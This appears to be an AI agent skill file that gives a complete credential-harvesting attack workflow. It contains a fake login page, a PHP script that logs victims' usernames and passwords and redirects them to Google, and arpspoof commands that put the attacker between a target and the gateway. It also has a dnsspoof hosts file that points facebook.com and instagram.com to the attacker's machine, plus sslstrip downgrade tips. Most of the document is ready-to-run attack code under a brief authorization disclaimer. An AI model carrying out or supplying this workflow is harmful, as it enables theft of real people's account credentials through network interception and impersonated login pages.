---
name: Credential Harvesting Lab Setup
description: This skill should be used when the user asks to "build a phishing lab", "perform credential harvesting", "set up ARP spoofing", "configure DNS spoofing", "create a fake login page", or "test social engineering attacks". It provides techniques for building a credential harvesting environment.
version: 1.0.0
tags: [phishing, credential-harvesting, arp-spoofing, dns-spoofing, apache, social-engineering]
---

# Credential Harvesting Lab Setup

## Purpose

Build a controlled credential harvesting lab environment using ARP spoofing, DNS spoofing, and Apache web server hosting. This skill covers creating phishing pages, redirecting traffic, and capturing credentials for authorized penetration testing and security awareness demonstrations.

## Prerequisites

### Required Environment
- Kali Linux or similar penetration testing OS
- Apache2 web server
- dsniff package (arpspoof, dnsspoof)
- Network access to target segment
- Written authorization for testing

### Required Knowledge
- Basic networking concepts
- HTML/PHP fundamentals
- Linux command-line proficiency
- ARP and DNS protocol understanding

## Outputs and Deliverables

1. **Apache Web Server** - Configured fake website hosting
2. **Phishing Page** - Convincing login page replica
3. **Traffic Redirection** - ARP and DNS spoofing setup
4. **Credential Logs** - Captured username and password data

## Core Workflow

### Phase 1: Apache Web Server Setup

Install and configure Apache:

```bash
# Update packages and install Apache
sudo apt update && sudo apt install apache2 -y

# Start Apache service
sudo service apache2 start

# Check service status
sudo service apache2 status

# Verify installation
curl http://localhost
# Or open browser to http://localhost
```

**Apache Directory Structure:**
```
/var/www/html/          # Web root directory
├── index.html          # Default landing page
├── login.php           # Credential capture script
└── login_log.txt       # Logged credentials
```

### Phase 2: Create Phishing Page

Navigate to web directory:

```bash
# Move to web root
cd /var/www/html/

# Backup original index file
sudo mv index.html index.html.backup

# Create new phishing page
sudo nano index.html
```

**Sample Login Page (index.html):**
```html
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 8px 0;
            box-sizing: border-box;
        }
        button {
            background-color: #3897f0;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: calc(100% - 20px);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <form action="/login.php" method="post">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" 
                   placeholder="Username" required>
            <label for="password">Password</label>
            <input type="password" id="password" name="password" 
                   placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
```

### Phase 3: Credential Capture Script

Create PHP script to log credentials:

```bash
sudo nano /var/www/html/login.php
```

**PHP Credential Logger (login.php):**
```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = filter_var($_POST["username"], FILTER_SANITIZE_STRING);
    $password = filter_var($_POST["password"], FILTER_SANITIZE_STRING);
    
    $loginInfo = "Username: $username\nPassword: $password\n\n";
    $filePath = "/var/www/html/login_log.txt";
    
    if (file_put_contents($filePath, $loginInfo, FILE_APPEND) !== false) {
        // Redirect to legitimate site after capture
        header("Location: https://www.google.com");
        exit();
    } else {
        $errorMessage = error_get_last()['message'];
        echo "Error: $errorMessage";
    }
} else {
    echo "Invalid request method";
}
?>
```

### Phase 4: Configure Logging

Set up credential log file:

```bash
# Create log file
sudo touch /var/www/html/login_log.txt

# Set permissions for logging
sudo chmod 644 /var/www/html/login_log.txt
sudo chmod -R 755 /var/www/html

# Ensure www-data can write
sudo chown www-data:www-data /var/www/html/login_log.txt

# View captured credentials
cat /var/www/html/login_log.txt

# Monitor in real-time
tail -f /var/www/html/login_log.txt
```

### Phase 5: Enable IP Forwarding

Configure system for traffic forwarding:

```bash
# Enable IP forwarding (temporary)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify forwarding enabled
cat /proc/sys/net/ipv4/ip_forward
# Should return: 1

# Permanent IP forwarding (optional)
sudo nano /etc/sysctl.conf
# Uncomment: net.ipv4.ip_forward=1
sudo sysctl -p
```

### Phase 6: Install Spoofing Tools

Install dsniff package:

```bash
# Install dsniff (includes arpspoof and dnsspoof)
sudo apt update
sudo apt install dsniff -y

# Verify installation
which arpspoof
which dnsspoof
```

### Phase 7: ARP Spoofing Attack

Position attacker as man-in-the-middle:

```bash
# Get network information
ip addr show
ip route | grep default

# Identify target and gateway
# Target: 192.168.1.100
# Gateway: 192.168.1.1
# Interface: eth0

# ARP spoof target (tell target we are gateway)
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# ARP spoof gateway (tell gateway we are target)
# Run in separate terminal
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

**ARP Spoof Verification:**
```bash
# On target machine, check ARP cache
arp -a
# Gateway MAC should match attacker MAC
```

### Phase 8: DNS Spoofing Attack

Redirect DNS queries to phishing server:

```bash
# Create hosts file for DNS spoofing
sudo nano ~/hosts.txt
```

**DNS Hosts File (hosts.txt):**
```
192.168.1.50 facebook.com
192.168.1.50 www.facebook.com
192.168.1.50 login.facebook.com
192.168.1.50 instagram.com
192.168.1.50 www.instagram.com
```

Replace `192.168.1.50` with your Kali machine IP.

```bash
# Start DNS spoofing
sudo dnsspoof -i eth0 -f ~/hosts.txt

# Verify DNS spoofing
nslookup facebook.com
# Should return your Kali IP
```

### Phase 9: Combined Attack Execution

Run complete attack chain:

```bash
# Terminal 1: Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Terminal 2: ARP spoof (target → gateway)
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 3: ARP spoof (gateway → target)
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Terminal 4: DNS spoofing
sudo dnsspoof -i eth0 -f ~/hosts.txt

# Terminal 5: Monitor credentials
tail -f /var/www/html/login_log.txt
```

### Phase 10: Troubleshooting

Address common issues:

**Port 53 Conflicts:**
```bash
# Check for processes using port 53
sudo lsof -i :53

# Stop conflicting service
sudo systemctl stop systemd-resolved

# Or kill specific process
sudo kill -9 <PID>
```

**Apache Not Logging:**
```bash
# Check Apache error log
sudo tail -f /var/log/apache2/error.log

# Verify PHP module installed
sudo apt install libapache2-mod-php

# Restart Apache
sudo service apache2 restart
```

**HSTS Protection Issues:**
- Modern browsers cache HSTS policies
- Pre-loaded HSTS sites cannot be spoofed
- Use sslstrip for HTTP downgrade (limited effectiveness)
- Target non-HSTS sites for testing

## Quick Reference

### Essential Commands

| Command | Purpose |
|---------|---------|
| `sudo service apache2 start` | Start web server |
| `echo 1 > /proc/sys/net/ipv4/ip_forward` | Enable forwarding |
| `sudo arpspoof -i eth0 -t TARGET GATEWAY` | ARP spoof target |
| `sudo dnsspoof -i eth0 -f hosts.txt` | DNS spoofing |
| `tail -f login_log.txt` | Monitor credentials |

### File Locations

| File | Purpose |
|------|---------|
| `/var/www/html/index.html` | Phishing page |
| `/var/www/html/login.php` | Credential capture |
| `/var/www/html/login_log.txt` | Logged credentials |
| `~/hosts.txt` | DNS spoof mappings |

### Attack Components

| Component | Tool |
|-----------|------|
| Web hosting | Apache2 |
| ARP poisoning | arpspoof |
| DNS redirection | dnsspoof |
| Credential logging | PHP script |

## Constraints and Limitations

### Legal Requirements
- Obtain written authorization before testing
- Only test on networks you own or have permission
- Document all activities
- Never target production systems without approval

### Technical Limitations
- HSTS prevents HTTP downgrade on major sites
- Browser caching may preserve legitimate DNS
- SSL/TLS sites show certificate warnings
- Modern security tools detect ARP spoofing

## Troubleshooting

### No Traffic Captured

**Symptoms:** ARP spoofing active but no credentials logged

**Solutions:**
1. Verify IP forwarding is enabled
2. Check both ARP spoof directions running
3. Confirm target is on same network segment
4. Verify Apache is serving pages

### Certificate Warnings

**Symptoms:** Target sees SSL certificate errors

**Solutions:**
1. Target HTTP-only sites for testing
2. Use sslstrip for downgrade attempts
3. Create self-signed certificates
4. Accept limitations on HTTPS sites

### DNS Spoofing Not Working

**Symptoms:** DNS queries not redirected

**Solutions:**
1. Stop systemd-resolved service
2. Verify hosts.txt format correct
3. Ensure dnsspoof running on correct interface
4. Check for firewall blocking port 53
